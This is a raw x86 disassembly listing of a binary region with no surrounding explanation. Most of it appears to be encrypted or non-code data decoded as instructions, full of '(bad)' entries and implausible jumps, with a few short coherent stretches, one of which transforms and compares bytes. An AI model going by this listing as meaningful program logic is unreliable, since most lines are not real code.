  40abf5:	xor    eax,DWORD PTR [ecx+0xa61daf4]
  40abfb:	mov    ch,0x44
  40abfd:	enter  0x8a50,0x43
  40ac01:	xor    al,0x5a
  40ac03:	pusha  
  40ac04:	fstp   DWORD PTR [edx]
  40ac06:	jnp    0x40ac32
  40ac08:	and    ebp,DWORD PTR [ecx]
  40ac0a:	dec    edi
  40ac0b:	(bad)  
  40ac0c:	jnp    0x40ac27
  40ac0e:	(bad)  
  40ac0f:	or     eax,0x6b5d0653
  40ac14:	or     dh,BYTE PTR [ecx-0x1e]
  40ac17:	imul   edi,DWORD PTR [edi+0x28],0x1894e13
  40ac1e:	push   ebx
  40ac1f:	mov    edi,0x55423573
  40ac24:	and    DWORD PTR [edx+edi*1+0x6b],edx
  40ac28:	stos   BYTE PTR es:[edi],al
  40ac29:	xchg   DWORD PTR [esi+0x2135cf5],ebx
  40ac2f:	test   BYTE PTR [eax-0x3c2b60da],bh
  40ac35:	scas   eax,DWORD PTR es:[edi]
  40ac36:	jmp    0xc5e4869a
  40ac3b:	jno    0x40abc8
  40ac3d:	call   DWORD PTR [esi-0x6a]
  40ac40:	xchg   esp,eax
  40ac41:	cmc    
  40ac42:	cmp    ecx,edi
  40ac44:	paddq  mm2,QWORD PTR [ecx+0x6bb82a1f]
  40ac4b:	rol    bl,0xf0
  40ac4e:	mov    ecx,0x4e00cec8
  40ac53:	in     eax,0x81
  40ac55:	adc    al,0xf0
  40ac57:	sub    DWORD PTR [ecx-0x6a8d7391],edi
  40ac5d:	jmp    DWORD PTR [edi]
  40ac5f:	lock pop ds
  40ac61:	and    ebp,DWORD PTR [ebp-0x78]
  40ac64:	inc    edi
  40ac65:	xor    cl,BYTE PTR [ebp+0x7104050f]
  40ac6b:	div    DWORD PTR [ebx-0x8]
  40ac6e:	ret    0x7511
  40ac71:	fadd   DWORD PTR [edi]
  40ac73:	fidivr WORD PTR [ebx+0x12]
  40ac76:	sub    al,0x39
  40ac78:	retf   
  40ac79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac7a:	(bad)  
  40ac7b:	jmp    0x22cce4bf
  40ac80:	(bad)  
  40ac81:	adc    ebx,DWORD PTR [ecx+0x28b5d9f3]
  40ac87:	aam    0xac
  40ac89:	gs cli 
  40ac8b:	aaa    
  40ac8c:	ds pop ebx
  40ac8e:	scas   al,BYTE PTR es:[edi]
  40ac8f:	stos   BYTE PTR es:[edi],al
  40ac90:	push   ecx
  40ac91:	mov    edi,0x56c9c55b
  40ac96:	jno    0x40ad14
  40ac98:	add    DWORD PTR [ebp+0x2c],ebx
  40ac9b:	xor    DWORD PTR [eax+0x2790a857],ebp
  40aca1:	shl    bh,0x79
  40aca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aca5:	and    al,0xd8
  40aca7:	pop    es
  40aca8:	add    DWORD PTR [esi+0x61],ecx
  40acab:	jbe    0x40ac72
  40acad:	or     al,0xd3
  40acaf:	in     al,dx
  40acb0:	dec    esi
  40acb1:	xchg   edx,eax
  40acb2:	sub    eax,0xa222fb20
  40acb7:	dec    eax
  40acb8:	cdq    
  40acb9:	xchg   edi,eax
  40acba:	mov    bl,0xcb
  40acbc:	aaa    
  40acbd:	and    bl,BYTE PTR [ebp+0x11]
  40acc0:	inc    esp
  40acc1:	mov    ebx,0x6900534b
  40acc6:	mov    DWORD PTR [edi+0x789bba79],esp
  40accc:	mov    ch,0xe1
  40acce:	fs shl ebp,1
  40acd1:	xor    DWORD PTR [esi],ebp
  40acd3:	ja     0x40ac59
  40acd5:	fnsave [ecx+esi*4-0x78dc9d9c]
  40acdc:	mov    edi,0x358fbfda
  40ace1:	shrd   DWORD PTR [esi],esi,cl
  40ace4:	cmovbe esp,DWORD PTR [ebx+0xf]
  40ace8:	push   edx
  40ace9:	call   0x6578ba2
  40acee:	jno    0x585d49a0
  40acf4:	bound  edi,QWORD PTR [ebx+0x61]
  40acf7:	mov    bh,0xc7
  40acf9:	dec    edi
  40acfa:	(bad)  
  40acfb:	fild   WORD PTR [ebx]
  40acfd:	xchg   esp,eax
  40acfe:	xor    eax,0x7c8401ea
  40ad03:	test   BYTE PTR [ebp+0x3c3db1e0],cl
  40ad09:	cmp    al,0x77
  40ad0b:	outs   dx,BYTE PTR ds:[esi]
  40ad0c:	xor    bl,BYTE PTR [edi+0x221c1fac]
  40ad12:	lahf   
  40ad13:	or     eax,0x5a6efcae
  40ad18:	or     al,0x5a
  40ad1a:	(bad)  
  40ad1b:	dec    esi
  40ad1c:	push   esp
  40ad1d:	xor    eax,edx
  40ad1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad20:	nop
  40ad21:	jle    0x40acbd
  40ad23:	and    esp,DWORD PTR [eax+0x25912e6d]
  40ad29:	dec    DWORD PTR [esi]
  40ad2b:	bound  esi,QWORD PTR [esi+0x4964eb60]
  40ad31:	mov    WORD PTR [edi+0x2f],?
  40ad34:	fist   DWORD PTR [eax+0x346581d]
  40ad3a:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40ad41:	add    al,0x8
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x71e68fc7]
  40ad81:	in     al,dx
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	dec    ebp
  40ad8b:	cmp    dl,BYTE PTR [edi-0x9]
  40ad8e:	pop    ds
  40ad8f:	ret    
  40ad90:	cmp    al,0x31
  40ad92:	push   ebp
  40ad93:	shr    edi,cl
  40ad95:	aaa    
  40ad96:	and    dh,BYTE PTR [edx+0x2a663f90]
  40ad9c:	daa    
  40ad9d:	add    DWORD PTR [ebx],ebx
  40ad9f:	jmp    0x40ad75
  40ada1:	dec    edx
  40ada2:	mov    al,ds:0xcaf8194
  40ada7:	ret    0x89a
  40adaa:	pushf  
  40adab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adad:	stos   BYTE PTR es:[edi],al
  40adae:	xor    DWORD PTR [edi+0xb523dc7],0xd0708263
  40adb8:	sahf   
  40adb9:	jno    0x40ad51
  40adbb:	cmc    
  40adbc:	sub    DWORD PTR [esi+0x49],ebx
  40adbf:	mov    ds:0x41049add,eax
  40adc4:	push   ds
  40adc5:	pop    ebp
  40adc6:	adc    dl,BYTE PTR ss:[esi-0x20]
  40adca:	jle    0x40ad6e
  40adcc:	sub    eax,0x33180aac
  40add1:	mov    ?,WORD PTR [ecx]
  40add3:	out    dx,eax
  40add4:	mov    ds:0x60585798,eax
  40add9:	sub    eax,DWORD PTR [ebx]
  40addb:	sbb    dl,cl
  40addd:	dec    ebx
  40adde:	add    BYTE PTR ss:[edx-0x6263bff0],ah
  40ade5:	adc    al,0xa0
  40ade7:	dec    ebx
  40ade8:	push   edx
  40ade9:	lock ret 0x5af1
  40aded:	and    DWORD PTR [ebx],esp
  40adef:	push   ss
  40adf0:	ds push ss
  40adf2:	rcl    DWORD PTR [esi],1
  40adf4:	loope  0x40ae10
  40adf6:	mov    bh,0x87
  40adf8:	icebp  
  40adf9:	call   FWORD PTR [eax+0x5e]
  40adfc:	push   esi
  40adfd:	xchg   esi,eax
  40adfe:	add    DWORD PTR [edi+0x7ed36a30],ecx
  40ae04:	out    dx,al
  40ae05:	and    eax,0x477d09a0
  40ae0a:	or     ecx,DWORD PTR [edi]
  40ae0c:	xchg   ebp,eax
  40ae0d:	sti    
  40ae0e:	add    al,BYTE PTR [edi]
  40ae10:	xor    DWORD PTR [ebx-0x5f9bc2e2],ebp
  40ae16:	adc    cl,dh
  40ae18:	loop   0x40ae4f
  40ae1a:	sahf   
  40ae1b:	das    
  40ae1c:	std    
  40ae1d:	mov    esi,0xb54603bf
  40ae22:	fbstp  TBYTE PTR [ebx+0x3a]
  40ae25:	jae    0x40ae27
  40ae27:	xor    BYTE PTR [ebp-0x579f1189],bh
  40ae2d:	cmp    ah,BYTE PTR [ebx]
  40ae2f:	xchg   edi,eax
  40ae30:	cmp    al,0xb7
  40ae32:	fs mul al
  40ae35:	push   ds
  40ae36:	pop    esi
  40ae37:	xchg   ebp,eax
  40ae38:	xor    al,0x7a
  40ae3a:	mov    dh,al
  40ae3c:	push   ds
  40ae3d:	push   ebp
  40ae3e:	sub    bh,bh
  40ae40:	in     al,dx
  40ae41:	mov    ds:0x5536539a,eax
  40ae46:	retf   
  40ae47:	push   ds
  40ae48:	out    0x6,al
  40ae4a:	fisttp QWORD PTR [ebp+0x65]
  40ae4d:	jnp    0x40aec6
  40ae4f:	fbstp  TBYTE PTR [ecx+0x3c50bbd0]
  40ae55:	sbb    esp,esp
  40ae57:	sbb    DWORD PTR [ecx+0x59],ecx
  40ae5a:	xchg   esp,eax
  40ae5b:	aas    
  40ae5c:	arpl   WORD PTR [eax-0x6d],bx
  40ae5f:	test   al,0xb5
  40ae61:	jmp    0x7730d78d
  40ae66:	cmp    eax,0x4c0b452f
  40ae6b:	fild   WORD PTR ds:0x79579d5b
  40ae71:	dec    ebp
  40ae72:	jle    0x40ae4e
  40ae74:	aas    
  40ae75:	dec    edi
  40ae76:	imul   edi,DWORD PTR [ecx],0x40783a16
  40ae7c:	repz rcr dh,cl
  40ae7f:	aas    
  40ae80:	popf   
  40ae81:	(bad)  
  40ae82:	mov    esi,0xb9f8a0bf
  40ae87:	fsubr  DWORD PTR ds:0xf6d075ed
  40ae8d:	add    eax,0xb8a38dfe
  40ae92:	adc    edx,ebp
  40ae94:	pop    es
  40ae95:	call   0x91f4b9e4
  40ae9a:	mov    bl,0xc0
  40ae9c:	xor    al,0xcf
  40ae9e:	setp   BYTE PTR [esi+edx*1+0x58324c4d]
  40aea6:	fnsetpm(287 only) 
  40aea8:	jecxz  0x40af06
  40aeaa:	test   DWORD PTR [ebx-0x37e11c19],esp
  40aeb0:	add    edi,DWORD PTR [edi+esi*4]
  40aeb3:	mov    bh,0x74
  40aeb5:	pop    esp
  40aeb6:	ds enter 0xd00,0xce
  40aebb:	push   ds
  40aebc:	mov    edi,0x4bbf73aa
  40aec1:	push   ebp
  40aec2:	jbe    0x40af2b
  40aec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aec5:	or     eax,0x84dab90f
  40aeca:	dec    DWORD PTR [eax]
  40aecc:	push   0x5f
  40aece:	adc    BYTE PTR ds:0x89f799da,bh
  40aed4:	mov    ds:0x1a425d5,al
  40aed9:	fisubr DWORD PTR [ecx]
  40aedb:	ins    BYTE PTR es:[edi],dx
  40aedc:	cmp    DWORD PTR [edx],edx
  40aede:	fs pop ebx
  40aee0:	push   esi
  40aee1:	(bad)  
  40aee2:	fadd   st(5),st
  40aee4:	pop    esp
  40aee5:	addr16 pop ecx
  40aee7:	stos   DWORD PTR es:[edi],eax
  40aee8:	mov    esi,0xfde9bca1
  40aeed:	and    eax,0xe3547d5f
  40aef2:	pushf  
  40aef3:	rcl    DWORD PTR fs:[edi-0x2a2e3c3a],cl
  40aefa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aefb:	xor    DWORD PTR [edi-0x70e5042b],eax
  40af01:	fwait
  40af02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af03:	lods   al,BYTE PTR ds:[esi]
  40af04:	cmp    ecx,ebx
  40af06:	out    0x6e,al
  40af08:	push   0xca951836
  40af0d:	xor    al,0x45
  40af0f:	mov    ecx,DWORD PTR [ecx]
  40af11:	dec    ebp
  40af12:	dec    ebp
  40af13:	xchg   BYTE PTR [edi+0x4996bb4e],ch
  40af19:	in     eax,dx
  40af1a:	inc    edi
  40af1c:	mov    edi,0x31ac088b
  40af21:	out    dx,al
  40af22:	jge    0x40af28
  40af24:	rcl    DWORD PTR [ecx],0x9
  40af27:	mov    ch,bl
  40af29:	test   al,0x41
  40af2b:	nop
  40af2c:	(bad)  
  40af2d:	push   ebp
  40af2e:	inc    esp
  40af2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af30:	jns    0x40af5b
  40af32:	ja     0x40afa0
  40af34:	add    DWORD PTR [edx],edx
  40af36:	xor    al,BYTE PTR [edi-0x50de327]
  40af3c:	jecxz  0x40af0c
  40af3e:	push   ebx
  40af3f:	or     al,0xd
  40af41:	pop    ds
  40af42:	cmp    ah,BYTE PTR [esi]
  40af44:	inc    edi
  40af45:	cmp    edi,DWORD PTR fs:[ecx]
  40af48:	mov    bl,0x53
  40af4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af4b:	loopne 0x40af99
  40af4d:	xor    al,al
  40af4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af50:	sub    ah,al
  40af52:	pop    ds
  40af53:	mov    ds:0x2d79cafa,al
  40af58:	fcomp  QWORD PTR [eax]
  40af5a:	adc    DWORD PTR [ebx-0x6bb3e5a1],eax
  40af60:	jno    0x40afdc
  40af62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af63:	icebp  
  40af64:	int3   
  40af65:	dec    esp
  40af66:	fiadd  WORD PTR [eax+0x66df6bd4]
  40af6c:	sub    DWORD PTR [edx],esi
  40af6e:	mov    al,ds:0xc2c372c
  40af73:	mov    DWORD PTR ds:0xb6cfca9b,ebp
  40af79:	out    0xf7,al
  40af7b:	jne    0x40af9d
  40af7d:	ret    
  40af7e:	aad    0xc3
  40af80:	dec    eax
  40af81:	inc    ebx
  40af82:	retf   0xa777
  40af85:	adc    DWORD PTR [esi],edi
  40af87:	adc    dh,BYTE PTR [ebp+0x21]
  40af8a:	push   edi
  40af8b:	xor    ebx,edx
  40af8d:	push   ss
  40af8e:	mov    esp,DWORD PTR [ebp+0x18]
  40af91:	in     al,dx
  40af92:	lea    esp,[edx+0x69360d63]
  40af98:	lock cmp BYTE PTR [ecx+0xf],0x72
  40af9d:	popf   
  40af9e:	xchg   ebp,eax
  40af9f:	je     0x40afbc
  40afa1:	jmp    0x40af68
  40afa3:	icebp  
  40afa4:	push   esi
  40afa5:	sub    al,0xb7
  40afa7:	mov    cl,BYTE PTR [edx+0x59]
  40afaa:	popf   
  40afab:	and    al,0x2
  40afad:	jns    0x40af9d
  40afaf:	ret    0xf1d8
  40afb2:	pop    ecx
  40afb3:	(bad)  
  40afb4:	and    esp,DWORD PTR [esi]
  40afb6:	(bad)  
  40afb7:	and    al,0xee
  40afb9:	sub    DWORD PTR [ecx],edi
  40afbb:	push   ecx
  40afbc:	(bad)  
  40afbd:	dec    ebp
  40afbe:	leave  
  40afbf:	xor    ebp,DWORD PTR [ebp+0x5d]
  40afc2:	fimul  WORD PTR [ebx+0x2980f01d]
  40afc8:	idiv   DWORD PTR [ecx]
  40afca:	or     bl,BYTE PTR [eax-0x18]
  40afcd:	scas   eax,DWORD PTR es:[edi]
  40afce:	loop   0x40b036
  40afd0:	push   ds
  40afd1:	mov    DWORD PTR [bx+di+0x38fe],ebx
  40afd6:	sahf   
  40afd7:	test   al,bh
  40afd9:	pop    eax
  40afda:	and    eax,0x245c4a4d
  40afdf:	test   BYTE PTR [ebp+0x13],ch
  40afe2:	pop    es
  40afe3:	cld    
  40afe4:	cmc    
  40afe5:	out    dx,al
  40afe6:	loop   0x40aff0
  40afe8:	add    al,0x54
  40afea:	stos   BYTE PTR es:[edi],al
  40afeb:	adc    dl,BYTE PTR [esi-0x4]
  40afee:	outs   dx,BYTE PTR ds:[esi]
  40afef:	lds    ecx,FWORD PTR [edx]
  40aff1:	data16 fiadd DWORD PTR [esi+esi*8+0x25]
  40aff6:	sub    DWORD PTR [ebp-0x67bfa667],edx
  40affc:	nop
  40affd:	loop   0x40afc7
  40afff:	fistp  WORD PTR [edx]
  40b001:	push   edi
  40b002:	xor    esi,DWORD PTR fs:[ecx-0x2f179ff0]
  40b009:	mov    DWORD PTR [edx-0x26],edi
  40b00c:	xor    dh,ah
  40b00e:	inc    edi
  40b00f:	push   ebx
  40b010:	out    dx,al
  40b011:	sbb    eax,0x851783fd
  40b016:	push   esi
  40b017:	pop    ebx
  40b018:	jae    0x40b04e
  40b01a:	ins    DWORD PTR es:[edi],dx
  40b01b:	bound  ebp,QWORD PTR [edi]
  40b01d:	adc    DWORD PTR [edi+0x74fee00a],eax
  40b023:	aaa    
  40b024:	clc    
  40b025:	fisttp WORD PTR [eax+0x5c9e9489]
  40b02b:	xchg   ebp,eax
  40b02c:	mov    dl,0xc5
  40b02e:	mov    ds:0x7b42aa62,eax
  40b033:	addr16 into 
  40b035:	fwait
  40b036:	xchg   esi,eax
  40b037:	mov    al,0x58
  40b039:	test   al,0x7f
  40b03b:	jmp    0x40afc4
  40b03d:	cdq    
  40b03e:	push   es
  40b03f:	dec    esp
  40b040:	clc    
  40b041:	or     ecx,edi
  40b043:	(bad)  
  40b044:	out    0x70,al
  40b046:	jb     0x40b04b
  40b048:	fisubr WORD PTR [ebx+0x4b]
  40b04b:	cmp    eax,0x113d9de2
  40b050:	lahf   
  40b051:	adc    DWORD PTR [ecx+0x43],eax
  40b054:	aam    0x9d
  40b056:	mov    BYTE PTR [ebx+0x12],dl
  40b059:	sbb    al,BYTE PTR [edx-0x5b]
  40b05c:	add    al,0xfd
  40b05e:	das    
  40b05f:	cmc    
  40b060:	dec    edi
  40b061:	popf   
  40b062:	cmp    al,0x42
  40b064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b065:	inc    eax
  40b066:	sbb    ah,cl
  40b068:	pop    ebp
  40b069:	jl     0x40b0e8
  40b06b:	mov    al,ds:0xc7b720a2
  40b070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b071:	ret    0xbb03
  40b074:	add    eax,0x3bdb4126
  40b079:	adc    ecx,0x67a7099d
  40b07f:	mov    ah,0x28
  40b081:	or     BYTE PTR [edi+0x742fda8],dl
  40b087:	pop    edx
  40b088:	dec    BYTE PTR [ecx+0x1563c83d]
  40b08e:	mov    eax,DWORD PTR [ebp-0x20]
  40b091:	mov    ecx,DWORD PTR [ebp-0x8]
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	or     al,0x61
  40b0bb:	aas    
  40b0bc:	and    cl,BYTE PTR [esi+edi*8]
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	mov    esp,0xeac0849
  40b0ca:	inc    edx
  40b0cb:	mov    al,ds:0x28feedf2
  40b0d0:	and    esi,DWORD PTR [edx+0x3e0582e3]
  40b0d6:	pop    ss
  40b0d7:	xor    edi,DWORD PTR [edx+0x293b06da]
  40b0dd:	je     0x40b139
  40b0df:	adc    DWORD PTR [eax+0x69],0x66
  40b0e3:	imul   edx,DWORD PTR [edx+0x10],0x78a09052
  40b0ea:	push   esp
  40b0eb:	push   ebx
  40b0ec:	test   eax,0x986de119
  40b0f1:	stos   BYTE PTR es:[edi],al
  40b0f2:	xchg   esi,eax
  40b0f3:	dec    esi
  40b0f4:	rcr    dl,0x49
  40b0f7:	gs cs dec ax
  40b0fb:	jmp    DWORD PTR [eax-0xe]
  40b0fe:	inc    ebx
  40b0ff:	sub    esp,DWORD PTR [ebx-0x55]
  40b102:	mov    al,ds:0x3a0994ac
  40b107:	outs   dx,DWORD PTR ds:[esi]
  40b108:	mov    dh,BYTE PTR [esi]
  40b10a:	cmp    ah,cl
  40b10c:	adc    DWORD PTR [eax-0x1846075c],ebx
  40b112:	data16 add ah,BYTE PTR [ecx-0xe2b6e6c]
  40b119:	mov    eax,ds:0x401baece
  40b11e:	sahf   
  40b11f:	ins    BYTE PTR es:[edi],dx
  40b120:	aam    0x81
  40b122:	and    dl,ch
  40b124:	add    ebp,ebx
  40b126:	je     0x40b16c
  40b128:	and    dl,BYTE PTR [edi+esi*2]
  40b12b:	dec    ecx
  40b12c:	ss ja  0x40b124
  40b12f:	hlt    
  40b130:	jle    0x40b165
  40b132:	dec    esp
  40b133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b134:	xor    DWORD PTR [eax-0x16443b5b],eax
  40b13a:	jns    0x40b15c
  40b13c:	and    BYTE PTR [eax+0x3cfb2e42],cl
  40b142:	push   ds
  40b143:	add    esi,edx
  40b145:	add    BYTE PTR [edi+edi*2-0x9],dh
  40b149:	and    eax,0xa2556fbe
  40b14e:	retf   0x31f9
  40b151:	jo     0x40b0ec
  40b153:	sub    DWORD PTR cs:0xcb18deb,0x4551179
  40b15e:	push   edi
  40b15f:	push   esi
  40b160:	xchg   ecx,eax
  40b161:	pop    esi
  40b162:	dec    ebx
  40b163:	(bad)  
  40b164:	ss loope 0x40b1d3
  40b167:	cld    
  40b168:	jne    0x40b105
  40b16a:	xor    al,0x47
  40b16c:	jl     0x40b1be
  40b16e:	push   esi
  40b16f:	cmp    bh,dh
  40b171:	and    BYTE PTR [eax+0xe],0x2b
  40b175:	(bad)  
  40b176:	dec    eax
  40b177:	les    ebp,FWORD PTR [esi+0x32]
  40b17a:	mov    bl,BYTE PTR [ebx+esi*2-0x12]
  40b17e:	xor    BYTE PTR [edx+0x4aee1429],ah
  40b184:	(bad)
  40b188:	pop    edi
  40b189:	stos   BYTE PTR es:[edi],al
  40b18a:	xchg   esp,eax
  40b18b:	jnp    0x40b204
  40b18d:	sti    
  40b18e:	inc    esp
  40b18f:	(bad)  
  40b191:	sub    bl,BYTE PTR [edi+0x5a]
  40b194:	and    BYTE PTR [esi-0x3f],ch
  40b197:	outs   dx,BYTE PTR ds:[esi]
  40b198:	push   ds
  40b199:	mov    DWORD PTR [esi],eax
  40b19b:	push   edi
  40b19c:	imul   ecx,DWORD PTR [eax],0xea8f08e0
  40b1a2:	pop    ecx
  40b1a3:	sbb    dl,bl
  40b1a5:	mov    ebx,0x659f0442
  40b1aa:	out    0xdf,al
  40b1ac:	push   0xffffffb0
  40b1ae:	scas   eax,DWORD PTR es:[edi]
  40b1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b0:	push   edi
  40b1b1:	leave  
  40b1b2:	mov    WORD PTR ds:0x1e807706,cs
  40b1b8:	int3   
  40b1b9:	sar    BYTE PTR [ebp+0x73],0x98
  40b1bd:	jmp    0x40b18d
  40b1bf:	cmc    
  40b1c0:	push   edx
  40b1c1:	pop    ebp
  40b1c2:	sahf   
  40b1c3:	and    edx,eax
  40b1c5:	push   ebx
  40b1c6:	imul   ecx,DWORD PTR [edx-0x5e],0xffffffae
  40b1ca:	jbe    0x40b158
  40b1cc:	aaa    
  40b1cd:	(bad)  
  40b1ce:	enter  0x5149,0x29
  40b1d2:	dec    esi
  40b1d3:	rcl    bl,cl
  40b1d5:	cmc    
  40b1d6:	enter  0x3f8e,0xd5
  40b1da:	inc    edx
  40b1db:	shl    dl,1
  40b1dd:	jmp    0x6e8f948e
  40b1e2:	shl    DWORD PTR ss:[esi-0x46],1
  40b1e6:	cmp    DWORD PTR ds:[edx+eax*8+0x665e5ecd],edi
  40b1ee:	pop    edx
  40b1ef:	adc    ebx,DWORD PTR [edx+esi*4-0x24ef415d]
  40b1f6:	clc    
  40b1f7:	icebp  
  40b1f8:	cli    
  40b1f9:	repnz repz dec ecx
  40b1fc:	xor    al,0x92
  40b1fe:	mov    edx,0x428b2cb8
  40b203:	fcomp  DWORD PTR [eax]
  40b205:	lea    ebp,[ebp+0x6d]
  40b208:	xor    eax,0xd05055d1
  40b20d:	mov    ah,0x2d
  40b20f:	jno    0x40b259
  40b211:	fadd   DWORD PTR [esi-0x39a77177]
  40b217:	xchg   esi,eax
  40b218:	rcl    BYTE PTR [edx+ebx*4+0x37d7f2aa],cl
  40b21f:	jbe    0x40b204
  40b221:	xchg   ebp,eax
  40b222:	fmul   QWORD PTR ds:0x49192fa1
  40b228:	pop    ebx
  40b229:	pop    ebp
  40b22a:	dec    esi
  40b22b:	aam    0xf8
  40b22d:	ss mov al,0x41
  40b230:	loopne 0x40b227
  40b232:	sbb    eax,DWORD PTR [ebx+0x38420717]
  40b238:	adc    bl,BYTE PTR [ebx]
  40b23a:	push   es
  40b23b:	add    DWORD PTR [eax+0x41],esi
  40b23e:	add    DWORD PTR [ebp-0x2e],esi
  40b241:	das    
  40b242:	jae    0x40b201
  40b244:	fucomip st,st(0)
  40b246:	ret    0x9a84
  40b249:	shl    BYTE PTR [eax],cl
  40b24b:	test   al,0x2e
  40b24d:	mov    ah,0x64
  40b24f:	xchg   ecx,eax
  40b250:	mov    BYTE PTR [edi+0x7d606212],ah
  40b256:	clc    
  40b257:	test   DWORD PTR [eax+0x4a],edi
  40b25a:	add    BYTE PTR [eax+ebx*2],0x15
  40b25e:	cmp    DWORD PTR [edi],esp
  40b260:	dec    ebx
  40b261:	outs   dx,DWORD PTR ds:[esi]
  40b262:	add    esp,ebx
  40b264:	dec    eax
  40b265:	test   BYTE PTR [eax-0xaf5be8f],0xfd
  40b26c:	add    al,0xc6
  40b26e:	xor    eax,0xe40aa181
  40b273:	push   ebx
  40b274:	test   BYTE PTR [esi-0x49],ch
  40b277:	clc    
  40b278:	cmp    bl,BYTE PTR [ecx+ebx*1]
  40b27b:	mov    ds:0xf898e829,al
  40b280:	or     al,0xe5
  40b282:	icebp  
  40b283:	jle    0x40b288
  40b285:	jge    0x40b2c0
  40b287:	cmp    DWORD PTR [ecx+0x2f],eax
  40b28a:	mov    DWORD PTR [eax-0x47],ebx
  40b28d:	xchg   esp,eax
  40b28e:	popf   
  40b28f:	mov    bl,0x39
  40b291:	stos   BYTE PTR es:[edi],al
  40b292:	cmp    eax,0x94c9e695
  40b297:	push   0xffffff89
  40b299:	xchg   esi,eax
  40b29a:	xchg   ebx,eax
  40b29b:	outs   dx,BYTE PTR ds:[esi]
  40b29c:	loop   0x40b310
  40b29e:	mov    dh,0xaa
  40b2a0:	jns    0x40b310
  40b2a2:	ror    DWORD PTR ds:0x6fcc38d8,0xc9
  40b2a9:	ss mov ecx,0x7be8fbf6
  40b2af:	mov    ah,0x68
  40b2b1:	sub    al,0x13
  40b2b3:	aam    0xa7
  40b2b5:	sbb    eax,DWORD PTR [ebx]
  40b2b7:	jb     0x40b2a7
  40b2b9:	mov    DWORD PTR [ebx-0x1a],esi
  40b2bc:	dec    esi
  40b2bd:	xchg   ecx,eax
  40b2be:	repz mov esp,0x58e27ecd
  40b2c4:	sbb    eax,0xc75b94b8
  40b2c9:	fwait
  40b2ca:	psubsw mm0,QWORD PTR fs:[edx+0x17]
  40b2cf:	(bad)
  40b2d2:	repz dec eax
  40b2d4:	sti    
  40b2d5:	mov    ch,0x10
  40b2d7:	sub    DWORD PTR [eax],ecx
  40b2d9:	add    dl,BYTE PTR [edi-0x62cedb1a]
  40b2df:	sahf   
  40b2e0:	cwde   
  40b2e1:	pop    eax
  40b2e2:	out    0xc9,al
  40b2e4:	fistp  DWORD PTR [edx]
  40b2e6:	pop    ss
  40b2e7:	push   edx
  40b2e8:	mov    al,0x3b
  40b2ea:	and    ah,al
  40b2ec:	aad    0xe7
  40b2ee:	fisubr WORD PTR [ecx]
  40b2f0:	sub    eax,0x3d8a0293
  40b2f5:	mov    ebx,0x84b1168c
  40b2fa:	adc    al,0xa6
  40b2fc:	or     edi,eax
  40b2fe:	dec    ebx
  40b2ff:	jae    0x40b284
  40b301:	pop    edx
  40b302:	inc    esi
  40b303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b304:	(bad)  
  40b305:	lods   al,BYTE PTR ds:[esi]
  40b306:	or     bl,BYTE PTR [esi-0x67]
  40b309:	push   ds
  40b30a:	cdq    
  40b30b:	icebp  
  40b30c:	sbb    bh,BYTE PTR [esi]
  40b30e:	sub    al,BYTE PTR [ecx]
  40b310:	iret   
  40b311:	aas    
  40b312:	dec    edx
  40b313:	in     al,dx
  40b314:	cmp    DWORD PTR [edx],esi
  40b316:	test   al,0x32
  40b318:	jbe    0x40b34a
  40b31a:	sbb    DWORD PTR [eiz*8+0x535ce861],esi
  40b321:	int    0x8
  40b323:	fnstenv [edx+0x56541259]
  40b329:	in     eax,0x57
  40b32b:	cwde   
  40b32c:	lock jb 0x40b309
  40b32f:	xor    bh,ch
  40b331:	xchg   edx,eax
  40b332:	mov    bl,0x70
  40b334:	adc    al,0xae
  40b336:	cmp    al,0xc1
